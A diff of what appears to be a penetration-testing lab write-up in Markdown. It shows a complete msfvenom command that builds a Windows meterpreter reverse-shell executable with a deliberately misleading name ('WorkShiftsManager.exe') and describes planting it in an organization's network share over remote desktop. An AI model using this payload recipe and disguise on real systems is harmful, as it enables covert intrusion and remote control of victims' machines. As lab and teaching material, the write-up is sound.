@@ -156,14 +156,13 @@ To open a remote desktop connection, we use the following command:
 	Using the option `-r disk:share=~/Desktop/share` we can share the folder `share` between the Kali machine and the remote DNS/File Server, so we are able to easily move documents between the two devices.
  
  6. **Generate of a payload for starting a reverse shell and inject it:**
-	In a different shell window, we now proceed with the generation of an exploit through which we will try to inject a reverse shell client to the computers of the organization.
-	We will use **`meterpreter`** as reverse shell; for doing so, we run the following command on the Kali Linux machine to generate a payload that launches the reverse shell client:
+	In a different shell window, we now proceed with the generation of an exploit through which we will try to inject a `meterpreter` reverse shell client to the computers of the organization. For doing so, we run the following command on the Kali machine to generate a payload that launches the reverse shell client:
 
     `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=10.0.2.15 -b "\x00" -f exe -o ./Desktop/WorkshiftsManager.exe`
 
-	 `msfvenom` is a pre-installed payload generator and encoder available on Kali, through which we build a `.exe` file executable on all Windows devices. This payload will spawn a reverse shell client, which will connect to the reverse shell server listening on the Kali machine (`10.0.2.15`) on the default TCP port (`4444`).
+	 `msfvenom` is a payload generator and encoder, through which we build a `.exe` file executable for Windows devices. This payload will spawn a reverse shell client, which will connect to the reverse shell server listening on the Kali machine (`10.0.2.15`) on the default TCP port (`4444`).
 
-	The output of the command execution is a `.exe` file that we will find on the Kali's desktop.
+	The output of the command execution is the  `.exe` file that we will find on the Kali's desktop.
 	The name of the executable (`WorkShiftsManager.exe`) is deliberately misleading since we want not to raise any suspicion.
 	
 	We now need to **inject** the exploit into the systems. For doing so, we can easily rely on the remote desktop connection that we have already opened: we copy the executable file into the folder shared between Kali and the server; then, from the remote desktop window that controls the server, we copy the file into the network shared folder.
@@ -232,11 +231,11 @@ To open a remote desktop connection, we use the following command:
 
 hhhh
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEyNjU3ODEzNzIsMjA0MTM1ODI0NCwtOD
-kwODI5MjYyLDE0MTQ2MTk3MDQsLTExMTAxNzg5NzMsLTYwMDQx
-OTEzMCw5MjczMDExNTYsLTY3MTU1MzEwMCwxMjM5MzYyNjcwLD
-ExMTY1MjUzOCwxNjk5NTEwMzcyLDU1MTIwNzk3MCwtMTYyNzM5
-MTI0MSwtMzMxNTc0MjcwLC0xNzA3NTg3MTUwLDE2MjMxMTM1OT
-EsNzQxNzUxNTA5LDE2OTUyMDAyNjgsMTYyOTQ1Mzk5MSwxMzI4
-NjI3NzZdfQ==
+eyJoaXN0b3J5IjpbLTE3NTMxMjAxNCwyMDQxMzU4MjQ0LC04OT
+A4MjkyNjIsMTQxNDYxOTcwNCwtMTExMDE3ODk3MywtNjAwNDE5
+MTMwLDkyNzMwMTE1NiwtNjcxNTUzMTAwLDEyMzkzNjI2NzAsMT
+ExNjUyNTM4LDE2OTk1MTAzNzIsNTUxMjA3OTcwLC0xNjI3Mzkx
+MjQxLC0zMzE1NzQyNzAsLTE3MDc1ODcxNTAsMTYyMzExMzU5MS
+w3NDE3NTE1MDksMTY5NTIwMDI2OCwxNjI5NDUzOTkxLDEzMjg2
+Mjc3Nl19
 -->
